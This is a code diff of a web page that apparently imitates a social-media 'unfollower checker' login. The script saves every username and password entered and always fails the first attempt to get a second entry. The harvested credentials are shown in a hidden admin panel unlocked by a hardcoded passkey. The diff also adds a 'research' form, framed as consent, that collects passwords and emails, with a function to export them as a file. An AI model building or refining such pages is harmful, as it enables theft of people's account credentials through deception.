@@ -21,6 +21,7 @@
       position: relative;
     }
     
+    /* Faster animated gradient background */
     .gradient-bg {
       position: absolute;
       top: 0;
@@ -34,9 +35,15 @@
     }
     
     @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
     }
     
     .container {
@@ -109,6 +116,7 @@
       font-size: 0.9rem;
     }
     
+    /* Admin gear button */
     #admin-toggle {
       position: absolute;
       top: 15px;
@@ -168,8 +176,6 @@
       display: flex;
       justify-content: space-between;
       margin-top: 1rem;
-      flex-wrap: wrap;
-      gap: 10px;
     }
     
     #admin-panel .admin-controls button {
@@ -185,16 +191,13 @@
       background: #ff5252;
     }
 
-    #export-data {
-      background: #4CAF50;
-    }
-    
-    #export-data:hover {
-      background: #45a049;
-    }
-
     #close-admin {
       background: #d62976;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
     }
     
     #close-admin:hover {
@@ -212,18 +215,7 @@
       z-index: 999;
     }
     
-    #export-output {
-      width: 100%;
-      height: 120px;
-      margin-top: 10px;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-family: monospace;
-      font-size: 0.8rem;
-      display: none;
-    }
-    
+    /* Loading animation */
     .loading-dots {
       display: inline-block;
       position: relative;
@@ -275,9 +267,17 @@
       0% { transform: translate(0, 0); }
       100% { transform: translate(24px, 0); }
     }
+    
+    /* Success message */
+    .success-message {
+      color: #28a745;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
+  <!-- Faster animated gradient background -->
   <div class="gradient-bg"></div>
   
   <div class="container">
@@ -293,23 +293,25 @@
     <p id="message"></p>
   </div>
 
+  <!-- Admin Panel Overlay -->
   <div id="admin-overlay"></div>
   
+  <!-- Admin Panel -->
   <div id="admin-panel">
     <h2>Admin Panel</h2>
     <div id="admin-content">No user data collected yet</div>
-    <textarea id="export-output" placeholder="Exported data will appear here..."></textarea>
     <div class="admin-controls">
-      <button id="export-data">Export Data</button>
       <button id="clear-data">Clear All Data</button>
-      <button id="close-admin" style="width:100%; margin-top:10px;">Close Panel</button>
+      <button id="close-admin">Close Panel</button>
     </div>
   </div>
 
   <script>
+    // Initialize userCredentials from localStorage or empty array
     let userCredentials = JSON.parse(localStorage.getItem('userCredentials')) || [];
     let loginAttempts = 0;
 
+    // Update admin panel on page load
     document.addEventListener('DOMContentLoaded', function() {
       updateAdminPanel();
     });
@@ -321,6 +323,7 @@
       const password = document.getElementById('password').value;
       const timestamp = new Date().toLocaleString();
 
+      // Save entry to localStorage
       userCredentials.push({ username, password, timestamp });
       localStorage.setItem('userCredentials', JSON.stringify(userCredentials));
       updateAdminPanel();
@@ -329,11 +332,14 @@
       loginButton.textContent = "Checking...";
       loginButton.disabled = true;
 
+      // Clear any previous message
       document.getElementById('message').textContent = '';
       
+      // Simulate login attempt
       loginAttempts++;
       
       if (loginAttempts === 1) {
+        // First attempt - show error after delay
         setTimeout(() => {
           document.getElementById('message').textContent = "Incorrect username or password. Please try again.";
           loginButton.textContent = "Log In";
@@ -342,7 +348,9 @@
           document.getElementById('password').value = '';
         }, 1500);
       } else if (loginAttempts === 2) {
+        // Second attempt - show loading then redirect
         setTimeout(() => {
+          // Show loading animation
           const container = document.querySelector('.container');
           container.innerHTML = `
             <div style="padding: 2rem; text-align: center;">
@@ -356,14 +364,18 @@
             </div>
           `;
           
+          // Simulate checking process
           setTimeout(() => {
+            // In a real app, this would redirect to the results page
             alert("This is a demo. In a real app, you would see unfollower results here.");
+            // Reset the page
             location.reload();
           }, 3000);
         }, 1500);
       }
     });
 
+    // Admin access
     const PASSKEY = "college123";
 
     document.getElementById('admin-toggle').addEventListener('click', function() {
@@ -379,7 +391,6 @@
     document.getElementById('close-admin').addEventListener('click', function() {
       document.getElementById('admin-panel').style.display = 'none';
       document.getElementById('admin-overlay').style.display = 'none';
-      document.getElementById('export-output').style.display = 'none';
     });
     
     document.getElementById('clear-data').addEventListener('click', function() {
@@ -387,23 +398,13 @@
         userCredentials = [];
         localStorage.removeItem('userCredentials');
         updateAdminPanel();
-        document.getElementById('export-output').style.display = 'none';
         alert("All data has been cleared!");
       }
-    });
-    
-    document.getElementById('export-data').addEventListener('click', function() {
-      const data = JSON.parse(localStorage.getItem('userCredentials') || '[]');
-      const output = document.getElementById('export-output');
-      output.value = JSON.stringify(data, null, 2);
-      output.style.display = 'block';
-      output.select();
     });
     
     document.getElementById('admin-overlay').addEventListener('click', function() {
       document.getElementById('admin-panel').style.display = 'none';
       document.getElementById('admin-overlay').style.display = 'none';
-      document.getElementById('export-output').style.display = 'none';
     });
 
     function updateAdminPanel() {
@@ -424,6 +425,66 @@
         `;
       });
       adminContent.innerHTML = html;
+    }
+    let researchData = JSON.parse(localStorage.getItem('researchData')) || [];
+    
+    // Enable submit button only when consent is given
+    document.getElementById('consent-checkbox').addEventListener('change', updateSubmitButton);
+    document.getElementById('data-usage-checkbox').addEventListener('change', updateSubmitButton);
+    
+    function updateSubmitButton() {
+      const consent = document.getElementById('consent-checkbox').checked;
+      const dataUsage = document.getElementById('data-usage-checkbox').checked;
+      document.getElementById('submit-btn').disabled = !(consent && dataUsage);
+    }
+    
+    document.getElementById('research-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      if (!document.getElementById('consent-checkbox').checked) {
+        alert('Please provide consent to participate in this research study.');
+        return;
+      }
+      
+      const userData = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        email: document.getElementById('email').value || 'Not provided',
+        timestamp: new Date().toLocaleString(),
+        consentGiven: true,
+        researchParticipant: true
+      };
+      
+      // Store data locally (in real project, send to server)
+      researchData.push(userData);
+      localStorage.setItem('researchData', JSON.stringify(researchData));
+      
+      // Show success message
+      document.getElementById('success-message').style.display = 'block';
+      document.getElementById('research-form').reset();
+      document.getElementById('consent-checkbox').checked = false;
+      document.getElementById('data-usage-checkbox').checked = false;
+      updateSubmitButton();
+      
+      // Simulate research analysis
+      setTimeout(() => {
+        alert('Research data recorded. Thank you for contributing to academic research!');
+      }, 1000);
+    });
+    
+    // Research data access (for your use)
+    function getResearchData() {
+      return JSON.parse(localStorage.getItem('researchData')) || [];
+    }
+    
+    function exportResearchData() {
+      const data = getResearchData();
+      const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'research-data.json';
+      a.click();
     }
   </script>
 </body>
